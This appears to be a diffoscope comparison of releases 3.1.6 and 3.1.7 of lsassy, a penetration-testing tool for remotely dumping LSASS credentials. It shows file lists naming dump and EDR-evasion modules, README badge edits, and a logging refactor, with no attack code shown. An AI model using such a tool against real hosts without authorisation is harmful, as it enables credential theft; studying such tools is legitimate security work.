@@ -1,0 +1,2271 @@
+--- tmp/lsassy-3.1.6.tar.gz
++++ tmp/lsassy-3.1.7.tar.gz
+├── filetype from file(1)
+│ @@ -1 +1 @@
+│ -gzip compressed data, was "lsassy-3.1.6.tar", last modified: Wed Nov 16 14:27:59 2022, max compression
+│ +gzip compressed data, was "lsassy-3.1.7.tar", last modified: Thu Apr  6 21:29:31 2023, max compression
+│   --- lsassy-3.1.6.tar
+├── +++ lsassy-3.1.7.tar
+│ ├── file list
+│ │ @@ -1,65 +1,65 @@
+│ │ -drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2022-11-16 14:27:59.090581 lsassy-3.1.6/
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     1066 2022-07-06 06:44:38.000000 lsassy-3.1.6/LICENSE
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)    19601 2022-11-16 14:27:59.090581 lsassy-3.1.6/PKG-INFO
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)    18995 2022-11-16 14:26:02.000000 lsassy-3.1.6/README.md
+│ │ -drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2022-11-16 14:27:59.070581 lsassy-3.1.6/lsassy/
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)       22 2022-11-16 14:26:02.000000 lsassy-3.1.6/lsassy/__init__.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     5519 2022-11-16 14:26:02.000000 lsassy-3.1.6/lsassy/console.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     9620 2022-07-06 14:07:16.000000 lsassy-3.1.6/lsassy/core.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     1784 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/credential.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     1491 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/dumper.py
+│ │ -drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2022-11-16 14:27:59.086581 lsassy-3.1.6/lsassy/dumpmethod/
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)    13609 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/dumpmethod/__init__.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)      683 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/dumpmethod/comsvcs.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     2738 2022-11-16 09:47:45.000000 lsassy-3.1.6/lsassy/dumpmethod/comsvcs_stealth.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     1163 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/dumpmethod/dllinject.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)      879 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/dumpmethod/dumpert.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)      949 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/dumpmethod/dumpertdll.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)    48723 2022-11-16 09:47:45.000000 lsassy-3.1.6/lsassy/dumpmethod/edrsandblast.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)      962 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/dumpmethod/mirrordump.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)  1394901 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/dumpmethod/mirrordump_embedded.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)      783 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/dumpmethod/nanodump.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)    47635 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/dumpmethod/nanodump_ssp_embedded.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     1067 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/dumpmethod/ppldump.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)   219008 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/dumpmethod/ppldump_embedded.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     1158 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/dumpmethod/procdump.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)   869865 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/dumpmethod/procdump_embedded.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     1236 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/dumpmethod/rawrpc.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)   318984 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/dumpmethod/rawrpc_embedded.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     1575 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/dumpmethod/rdrleakdiag.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     1510 2022-11-16 09:47:45.000000 lsassy-3.1.6/lsassy/dumpmethod/silentprocessexit.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     1788 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/dumpmethod/sqldumper.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     1024 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/dumpmethod/wer.py
+│ │ -drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2022-11-16 14:27:59.086581 lsassy-3.1.6/lsassy/exec/
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)      652 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/exec/__init__.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     6631 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/exec/mmc.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     4906 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/exec/smb.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     7520 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/exec/smb_stealth.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     4902 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/exec/task.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     2952 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/exec/wmi.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     9327 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/impacketfile.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     2507 2022-11-16 09:47:45.000000 lsassy-3.1.6/lsassy/logger.py
+│ │ -drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2022-11-16 14:27:59.090581 lsassy-3.1.6/lsassy/output/
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     1410 2022-07-06 14:07:16.000000 lsassy-3.1.6/lsassy/output/__init__.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)      473 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/output/grep_output.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)      878 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/output/json_output.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     2067 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/output/pretty_output.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     1902 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/output/table_output.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     3999 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/parser.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     3214 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/session.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     2244 2022-07-06 06:44:38.000000 lsassy-3.1.6/lsassy/utils.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     5466 2022-07-07 15:09:31.000000 lsassy-3.1.6/lsassy/writer.py
+│ │ -drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2022-11-16 14:27:59.074581 lsassy-3.1.6/lsassy.egg-info/
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)    19601 2022-11-16 14:27:58.000000 lsassy-3.1.6/lsassy.egg-info/PKG-INFO
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     1455 2022-11-16 14:27:58.000000 lsassy-3.1.6/lsassy.egg-info/SOURCES.txt
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)        1 2022-11-16 14:27:58.000000 lsassy-3.1.6/lsassy.egg-info/dependency_links.txt
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)       47 2022-11-16 14:27:58.000000 lsassy-3.1.6/lsassy.egg-info/entry_points.txt
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)       38 2022-11-16 14:27:58.000000 lsassy-3.1.6/lsassy.egg-info/requires.txt
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)       13 2022-11-16 14:27:58.000000 lsassy-3.1.6/lsassy.egg-info/top_level.txt
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)        1 2022-11-16 14:27:58.000000 lsassy-3.1.6/lsassy.egg-info/zip-safe
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)      879 2022-11-16 14:26:02.000000 lsassy-3.1.6/pyproject.toml
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)       38 2022-11-16 14:27:59.090581 lsassy-3.1.6/setup.cfg
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)     1289 2022-11-16 14:26:02.000000 lsassy-3.1.6/setup.py
+│ │ -drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2022-11-16 14:27:59.090581 lsassy-3.1.6/tests/
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)        0 2022-07-06 06:44:38.000000 lsassy-3.1.6/tests/__init__.py
+│ │ --rw-r--r--   0 pixis     (1000) pixis     (1000)       87 2022-11-16 14:26:02.000000 lsassy-3.1.6/tests/test_lsassy.py
+│ │ +drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2023-04-06 21:29:31.759113 lsassy-3.1.7/
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     1066 2022-06-30 17:04:33.000000 lsassy-3.1.7/LICENSE
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)    19600 2023-04-06 21:29:31.759113 lsassy-3.1.7/PKG-INFO
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)    18994 2023-04-06 21:29:06.000000 lsassy-3.1.7/README.md
+│ │ +drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2023-04-06 21:29:31.751113 lsassy-3.1.7/lsassy/
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)       22 2023-04-06 21:29:06.000000 lsassy-3.1.7/lsassy/__init__.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     5826 2023-04-06 21:29:06.000000 lsassy-3.1.7/lsassy/console.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     9526 2023-04-06 21:29:06.000000 lsassy-3.1.7/lsassy/core.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     1784 2022-06-30 17:55:32.000000 lsassy-3.1.7/lsassy/credential.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     1526 2023-04-06 21:29:06.000000 lsassy-3.1.7/lsassy/dumper.py
+│ │ +drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2023-04-06 21:29:31.759113 lsassy-3.1.7/lsassy/dumpmethod/
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)    14007 2023-04-06 21:29:06.000000 lsassy-3.1.7/lsassy/dumpmethod/__init__.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)      683 2022-06-30 17:55:32.000000 lsassy-3.1.7/lsassy/dumpmethod/comsvcs.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     2787 2023-04-06 21:29:06.000000 lsassy-3.1.7/lsassy/dumpmethod/comsvcs_stealth.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     1163 2022-06-30 17:55:32.000000 lsassy-3.1.7/lsassy/dumpmethod/dllinject.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)      879 2022-06-30 17:55:32.000000 lsassy-3.1.7/lsassy/dumpmethod/dumpert.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)      949 2022-06-30 17:55:32.000000 lsassy-3.1.7/lsassy/dumpmethod/dumpertdll.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)    48810 2023-04-06 21:29:06.000000 lsassy-3.1.7/lsassy/dumpmethod/edrsandblast.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)      962 2022-06-30 17:55:32.000000 lsassy-3.1.7/lsassy/dumpmethod/mirrordump.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)  1394901 2022-06-30 17:55:33.000000 lsassy-3.1.7/lsassy/dumpmethod/mirrordump_embedded.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)      783 2022-06-30 17:55:33.000000 lsassy-3.1.7/lsassy/dumpmethod/nanodump.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)    47635 2022-06-30 17:55:33.000000 lsassy-3.1.7/lsassy/dumpmethod/nanodump_ssp_embedded.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     1067 2022-06-30 17:55:33.000000 lsassy-3.1.7/lsassy/dumpmethod/ppldump.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)   219008 2022-06-30 17:55:33.000000 lsassy-3.1.7/lsassy/dumpmethod/ppldump_embedded.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     1158 2022-06-30 17:55:33.000000 lsassy-3.1.7/lsassy/dumpmethod/procdump.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)   869865 2022-06-30 17:55:33.000000 lsassy-3.1.7/lsassy/dumpmethod/procdump_embedded.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     1236 2022-06-30 17:55:33.000000 lsassy-3.1.7/lsassy/dumpmethod/rawrpc.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)   318984 2022-06-30 17:55:33.000000 lsassy-3.1.7/lsassy/dumpmethod/rawrpc_embedded.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     1575 2022-06-30 17:55:33.000000 lsassy-3.1.7/lsassy/dumpmethod/rdrleakdiag.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     1510 2022-11-09 19:22:32.000000 lsassy-3.1.7/lsassy/dumpmethod/silentprocessexit.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     1788 2022-06-30 17:55:33.000000 lsassy-3.1.7/lsassy/dumpmethod/sqldumper.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     1024 2022-06-30 17:04:33.000000 lsassy-3.1.7/lsassy/dumpmethod/wer.py
+│ │ +drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2023-04-06 21:29:31.759113 lsassy-3.1.7/lsassy/exec/
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)      698 2023-04-06 21:29:06.000000 lsassy-3.1.7/lsassy/exec/__init__.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     6667 2023-04-06 21:29:06.000000 lsassy-3.1.7/lsassy/exec/mmc.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     4995 2023-04-06 21:29:06.000000 lsassy-3.1.7/lsassy/exec/smb.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     7622 2023-04-06 21:29:06.000000 lsassy-3.1.7/lsassy/exec/smb_stealth.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     4939 2023-04-06 21:29:06.000000 lsassy-3.1.7/lsassy/exec/task.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     2987 2023-04-06 21:29:06.000000 lsassy-3.1.7/lsassy/exec/wmi.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     9555 2023-04-06 21:29:06.000000 lsassy-3.1.7/lsassy/impacketfile.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     2625 2023-04-06 21:29:06.000000 lsassy-3.1.7/lsassy/logger.py
+│ │ +drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2023-04-06 21:29:31.759113 lsassy-3.1.7/lsassy/output/
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     1418 2023-04-06 21:29:06.000000 lsassy-3.1.7/lsassy/output/__init__.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)      473 2022-06-30 17:04:33.000000 lsassy-3.1.7/lsassy/output/grep_output.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)      878 2022-06-30 17:04:33.000000 lsassy-3.1.7/lsassy/output/json_output.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     2123 2023-04-06 21:29:06.000000 lsassy-3.1.7/lsassy/output/pretty_output.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     1902 2022-06-30 17:55:33.000000 lsassy-3.1.7/lsassy/output/table_output.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     4008 2023-04-06 21:29:06.000000 lsassy-3.1.7/lsassy/parser.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     3407 2023-04-06 21:29:06.000000 lsassy-3.1.7/lsassy/session.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     2244 2022-06-30 17:04:33.000000 lsassy-3.1.7/lsassy/utils.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     5495 2023-04-06 21:29:06.000000 lsassy-3.1.7/lsassy/writer.py
+│ │ +drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2023-04-06 21:29:31.751113 lsassy-3.1.7/lsassy.egg-info/
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)    19600 2023-04-06 21:29:31.000000 lsassy-3.1.7/lsassy.egg-info/PKG-INFO
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     1455 2023-04-06 21:29:31.000000 lsassy-3.1.7/lsassy.egg-info/SOURCES.txt
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)        1 2023-04-06 21:29:31.000000 lsassy-3.1.7/lsassy.egg-info/dependency_links.txt
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)       47 2023-04-06 21:29:31.000000 lsassy-3.1.7/lsassy.egg-info/entry_points.txt
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)       38 2023-04-06 21:29:31.000000 lsassy-3.1.7/lsassy.egg-info/requires.txt
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)       13 2023-04-06 21:29:31.000000 lsassy-3.1.7/lsassy.egg-info/top_level.txt
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)        1 2023-04-06 21:29:31.000000 lsassy-3.1.7/lsassy.egg-info/zip-safe
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)      879 2023-04-06 21:29:06.000000 lsassy-3.1.7/pyproject.toml
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)       38 2023-04-06 21:29:31.759113 lsassy-3.1.7/setup.cfg
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)     1289 2023-04-06 21:29:06.000000 lsassy-3.1.7/setup.py
+│ │ +drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2023-04-06 21:29:31.759113 lsassy-3.1.7/tests/
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)        0 2022-06-30 17:06:30.000000 lsassy-3.1.7/tests/__init__.py
+│ │ +-rw-r--r--   0 pixis     (1000) pixis     (1000)       87 2023-04-06 21:29:06.000000 lsassy-3.1.7/tests/test_lsassy.py
+│ │   --- lsassy-3.1.6/LICENSE
+│ ├── +++ lsassy-3.1.7/LICENSE
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/PKG-INFO
+│ ├── +++ lsassy-3.1.7/PKG-INFO
+│ │┄ Files 0% similar despite different names
+│ │ @@ -1,10 +1,10 @@
+│ │  Metadata-Version: 2.1
+│ │  Name: lsassy
+│ │ -Version: 3.1.6
+│ │ +Version: 3.1.7
+│ │  Summary: Python library to extract credentials from lsass remotely
+│ │  Home-page: https://github.com/Hackndo/lsassy/
+│ │  Author: Pixis
+│ │  Author-email: hackndo@gmail.com
+│ │  License: MIT
+│ │  Classifier: Programming Language :: Python :: 3.6
+│ │  Classifier: Programming Language :: Python :: 3.7
+│ │ @@ -13,16 +13,15 @@
+│ │  Classifier: License :: OSI Approved :: MIT License
+│ │  Classifier: Operating System :: OS Independent
+│ │  Requires-Python: >=3.6
+│ │  Description-Content-Type: text/markdown
+│ │  License-File: LICENSE
+│ │  
+│ │  # lsassy
+│ │ -
+│ │ -[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=3.1.6&x2=0)](https://pypi.org/project/lsassy/)
+│ │ +[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=v3.1.7&x2=0)](https://pypi.org/project/lsassy)
+│ │  [![PyPI Statistics](https://img.shields.io/pypi/dm/lsassy.svg)](https://pypistats.org/packages/lsassy)
+│ │  [![Tests](https://github.com/hackndo/lsassy/workflows/Tests/badge.svg)](https://github.com/hackndo/lsassy/actions?workflow=Tests)
+│ │  [![Twitter](https://img.shields.io/twitter/follow/hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/follow?screen_name=hackanddo)
+│ │  
+│ │  <a href="https://asciinema.org/a/441582?autoplay=1" target="_blank"><img src="https://asciinema.org/a/441582.svg" width="80%"></a>
+│ │  
+│ │  Python tool to remotely extract credentials on a set of hosts. This [blog post](https://en.hackndo.com/remote-lsass-dump-passwords/) explains how it works.
+│ │ ├── html2text {}
+│ │ │ @@ -1,17 +1,17 @@
+│ │ │ -Metadata-Version: 2.1 Name: lsassy Version: 3.1.6 Summary: Python library to
+│ │ │ +Metadata-Version: 2.1 Name: lsassy Version: 3.1.7 Summary: Python library to
+│ │ │  extract credentials from lsass remotely Home-page: https://github.com/Hackndo/
+│ │ │  lsassy/ Author: Pixis Author-email: hackndo@gmail.com License: MIT Classifier:
+│ │ │  Programming Language :: Python :: 3.6 Classifier: Programming Language ::
+│ │ │  Python :: 3.7 Classifier: Programming Language :: Python :: 3.8 Classifier:
+│ │ │  Programming Language :: Python :: 3.9 Classifier: License :: OSI Approved ::
+│ │ │  MIT License Classifier: Operating System :: OS Independent Requires-Python:
+│ │ │  >=3.6 Description-Content-Type: text/markdown License-File: LICENSE # lsassy [!
+│ │ │  [PyPI version](https://d25lcipzij17d.cloudfront.net/
+│ │ │ -badge.svg?id=py&type=6&v=3.1.6&x2=0)](https://pypi.org/project/lsassy/) [![PyPI
+│ │ │ +badge.svg?id=py&type=6&v=v3.1.7&x2=0)](https://pypi.org/project/lsassy) [![PyPI
+│ │ │  Statistics](https://img.shields.io/pypi/dm/lsassy.svg)](https://pypistats.org/
+│ │ │  packages/lsassy) [![Tests](https://github.com/hackndo/lsassy/workflows/Tests/
+│ │ │  badge.svg)](https://github.com/hackndo/lsassy/actions?workflow=Tests) [!
+│ │ │  [Twitter](https://img.shields.io/twitter/follow/
+│ │ │  hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/
+│ │ │  follow?screen_name=hackanddo) [https://asciinema.org/a/441582.svg] Python tool
+│ │ │  to remotely extract credentials on a set of hosts. This [blog post](https://
+│ │   --- lsassy-3.1.6/README.md
+│ ├── +++ lsassy-3.1.7/README.md
+│ │┄ Files 0% similar despite different names
+│ │ @@ -1,10 +1,9 @@
+│ │  # lsassy
+│ │ -
+│ │ -[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=3.1.6&x2=0)](https://pypi.org/project/lsassy/)
+│ │ +[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=v3.1.7&x2=0)](https://pypi.org/project/lsassy)
+│ │  [![PyPI Statistics](https://img.shields.io/pypi/dm/lsassy.svg)](https://pypistats.org/packages/lsassy)
+│ │  [![Tests](https://github.com/hackndo/lsassy/workflows/Tests/badge.svg)](https://github.com/hackndo/lsassy/actions?workflow=Tests)
+│ │  [![Twitter](https://img.shields.io/twitter/follow/hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/follow?screen_name=hackanddo)
+│ │  
+│ │  <a href="https://asciinema.org/a/441582?autoplay=1" target="_blank"><img src="https://asciinema.org/a/441582.svg" width="80%"></a>
+│ │  
+│ │  Python tool to remotely extract credentials on a set of hosts. This [blog post](https://en.hackndo.com/remote-lsass-dump-passwords/) explains how it works.
+│ │ ├── html2text {}
+│ │ │ @@ -1,9 +1,9 @@
+│ │ │  # lsassy [![PyPI version](https://d25lcipzij17d.cloudfront.net/
+│ │ │ -badge.svg?id=py&type=6&v=3.1.6&x2=0)](https://pypi.org/project/lsassy/) [![PyPI
+│ │ │ +badge.svg?id=py&type=6&v=v3.1.7&x2=0)](https://pypi.org/project/lsassy) [![PyPI
+│ │ │  Statistics](https://img.shields.io/pypi/dm/lsassy.svg)](https://pypistats.org/
+│ │ │  packages/lsassy) [![Tests](https://github.com/hackndo/lsassy/workflows/Tests/
+│ │ │  badge.svg)](https://github.com/hackndo/lsassy/actions?workflow=Tests) [!
+│ │ │  [Twitter](https://img.shields.io/twitter/follow/
+│ │ │  hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/
+│ │ │  follow?screen_name=hackanddo) [https://asciinema.org/a/441582.svg] Python tool
+│ │ │  to remotely extract credentials on a set of hosts. This [blog post](https://
+│ │   --- lsassy-3.1.6/lsassy/console.py
+│ ├── +++ lsassy-3.1.7/lsassy/console.py
+│ │┄ Files 6% similar despite different names
+│ │ @@ -1,13 +1,15 @@
+│ │  import argparse
+│ │  import sys
+│ │  
+│ │  from lsassy import __version__
+│ │  from lsassy.core import ThreadPool
+│ │  from lsassy.dumper import Dumper
+│ │ +from lsassy.logger import lsassy_logger
+│ │ +import logging
+│ │  
+│ │  
+│ │  def main():
+│ │      """
+│ │          Command line function to call lsassy
+│ │          """
+│ │      version = __version__
+│ │ @@ -78,12 +80,20 @@
+│ │  
+│ │      if len(sys.argv) == 1:
+│ │          parser.print_help()
+│ │          sys.exit(1)
+│ │  
+│ │      args = parser.parse_args()
+│ │  
+│ │ +    if args.v == 1:
+│ │ +        lsassy_logger.setLevel(logging.INFO)
+│ │ +    elif args.v >= 2:
+│ │ +        lsassy_logger.setLevel(logging.DEBUG)
+│ │ +        lsassy_logger.info("lsassy v {}".format(__version__))
+│ │ +    else:
+│ │ +        lsassy_logger.setLevel(logging.ERROR)
+│ │ +
+│ │      ThreadPool(args.target, args).run()
+│ │  
+│ │  
+│ │  if __name__ == "__main__":
+│ │      main()
+│ │   --- lsassy-3.1.6/lsassy/core.py
+│ ├── +++ lsassy-3.1.7/lsassy/core.py
+│ │┄ Files 18% similar despite different names
+│ │ @@ -1,21 +1,22 @@
+│ │  import logging
+│ │  import queue
+│ │  import signal
+│ │  import threading
+│ │  import time
+│ │  from queue import Queue
+│ │  
+│ │ -from lsassy import logger, __version__
+│ │ +from lsassy import __version__
+│ │  from lsassy.dumper import Dumper
+│ │  from lsassy.impacketfile import ImpacketFile
+│ │  from lsassy.parser import Parser
+│ │  from lsassy.session import Session
+│ │  from lsassy.utils import get_targets
+│ │  from lsassy.writer import Writer
+│ │ +from lsassy.logger import lsassy_logger
+│ │  
+│ │  lock = threading.RLock()
+│ │  
+│ │  
+│ │  class Worker(threading.Thread):
+│ │      def __init__(self, task_q):
+│ │          super().__init__()
+│ │ @@ -39,64 +40,55 @@
+│ │  
+│ │  class ThreadPool:
+│ │      def __init__(self, targets, arguments):
+│ │          self.targets = get_targets(targets)
+│ │          self.arguments = arguments
+│ │          self.threads = []
+│ │          self.max_threads = arguments.threads
+│ │ -        self.task_q = Queue(self.max_threads+10)
+│ │ +        self.task_q = Queue(self.max_threads)
+│ │ +        lsassy_logger.no_color = self.arguments.no_color
+│ │          signal.signal(signal.SIGINT, self.interrupt_event)
+│ │          signal.signal(signal.SIGTERM, self.interrupt_event)
+│ │  
+│ │      def interrupt_event(self, signum, stack):
+│ │ -        logging.error("**CTRL+C** QUITTING GRACEFULLY")
+│ │ +        lsassy_logger.error("**CTRL+C** QUITTING GRACEFULLY")
+│ │          self.stop()
+│ │          raise KeyboardInterrupt
+│ │  
+│ │      def stop(self):
+│ │          for thread in self.threads:
+│ │              thread.shutdown_flag.set()
+│ │          for thread in self.threads:
+│ │              thread.join()
+│ │  
+│ │      def isRunning(self):
+│ │          return any(thread.is_alive() for thread in self.threads)
+│ │  
+│ │      def run(self):
+│ │ -        logger.init(no_color=self.arguments.no_color)
+│ │          threading.current_thread().name = "[Core]"
+│ │  
+│ │ -        if self.arguments.v == 1:
+│ │ -            logging.getLogger().setLevel(logging.INFO)
